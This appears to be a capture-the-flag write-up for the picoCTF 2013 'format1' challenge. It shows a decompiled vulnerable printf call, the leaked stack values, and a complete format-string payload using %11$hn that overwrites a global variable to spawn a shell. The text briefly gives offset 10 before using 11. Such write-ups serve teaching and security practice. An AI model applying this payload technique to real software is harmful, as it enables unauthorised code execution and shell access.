### S0lv3d by H4yicl3

First we download the source

try input it with format parameter
```
hayicle@ubuntu:~/ctf/2013pico$ ./format1
%x_%x_%x
ff8f151c_50_0
3!
```
so we know. the program has format bug.

open in IDA and try to understand the source code
```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  int result; // eax@3
  int v4; // edx@3
  int v5; // [sp+2Ch] [bp-5Ch]@1
  int v6; // [sp+7Ch] [bp-Ch]@1

  v6 = *MK_FP(__GS__, 20);
  be_nice_to_people();
  memset(&v5, 0, 0x50u);
  read(0, &v5, 0x50u);
  printf((const char *)&v5);	//<------ bug here !! mind it
  printf("%d!\n", x);						//we need to know the address of x
  if ( x == 4 )								//try modify it equal 4
  {
    puts("running sh...");					//we have shell
    system("/bin/sh");
  }
  result = 0;
  v4 = *MK_FP(__GS__, 20) ^ v6;
  return result;
}
```
use IDA to find the address of x
```
.data:0804A02C x               dd 3                    ; DATA XREF: main+65r
```
now we have address of x !! that is 0x0804a02c
so we try to leak address it with the python script

```
hayicle@ubuntu:~/ctf/2013pico$ (python -c 'print "AAAA"+"%x_"*50')|./format1
																		
AAAAffa8021c_50_0_ffa802b4_ffa80228_ffa80220_ffa80314_f77b8938_0_50_41414141(string AAAA)_255f7825_78255f78
_5f78255f_255f7825_78255f78_5f78255f_255f7825_78255f78_5f78255f_255f7825_78255f78_5f78255f_255f7825_78255f78_3!
```
So you see the hex of string AAAA we input is at offset 11
so we can insert the address of x to offset 10 then we can modify it !!
the python script look like
```
(python -c 'print "\x2c\xa0\x04\x08"+"%x_"*50')|./format1
,ffc22aac_50_0_ffc22b44_ffc22ab8_ffc22ab0_ffc22ba4_f7703938_0_50_804a02c(address of x)_255f7825_78255f78_5f78255f_255f7825_
78255f78_5f78255f_255f7825_78255f78_5f78255f_255f7825_78255f78_5f78255f_255f7825_78255f78_3!
```
ok ! try to modify it with %(offset)$n
the offset is 11(you can count from left to right)
```
hayicle@ubuntu:~/ctf/2013pico$ (python -c 'print "\x2c\xa0\x04\x08"+"%11$hn"';cat)|./format1
,?
4!<---- we change it become 4 already!!
running sh...
whoami
hayicle
```
well done!!